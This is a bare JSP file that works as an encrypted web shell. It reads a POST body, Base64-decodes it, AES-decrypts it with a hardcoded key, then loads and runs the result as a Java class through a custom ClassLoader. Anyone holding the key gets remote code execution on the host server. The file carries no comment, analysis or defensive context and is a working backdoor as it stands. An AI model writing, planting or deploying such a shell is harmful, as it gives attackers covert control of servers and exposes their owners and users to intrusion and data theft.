<%!
    private byte[] Decrypt(byte[] data) throws Exception {
        String k = "e45e329feb5d925b";
        javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES/ECB/PKCS5Padding");
        c.init(2, new javax.crypto.spec.SecretKeySpec(k.getBytes(), "AES"));
        byte[] decodebs;
        Class baseCls;
        try {
            baseCls = Class.forName("java.util.Base64");
            Object Decoder = baseCls.getMethod("getDecoder", null).invoke(baseCls, null);
            decodebs = (byte[]) Decoder.getClass().getMethod("decode", new Class[]{byte[].class}).invoke(Decoder, new Object[]{data});
        } catch (Throwable e) {
            baseCls = Class.forName("sun.misc.BASE64Decoder");
            Object Decoder = baseCls.newInstance();
            decodebs = (byte[]) Decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(Decoder, new Object[]{new String(data)});
        }
        return c.doFinal(decodebs);
    }
%>
<%!
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }
        public Class g(byte []b) {
            return super.defineClass(b,0,b.length);
        }
    }
%>
<%
    if (request.getMethod().equals("POST")) {
        java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
        byte[] buf = new byte[512];
        int length = request.getInputStream().read(buf);
        while (length>0) {
            byte[] data = java.util.Arrays.copyOfRange(buf,0,length);
            bos.write(data);
            length = request.getInputStream().read(buf);
        }
        out.clear();
        out = pageContext.pushBody();
        new U(this.getClass().getClassLoader()).g(Decrypt(bos.toByteArray())).newInstance().equals(pageContext);
    }
%>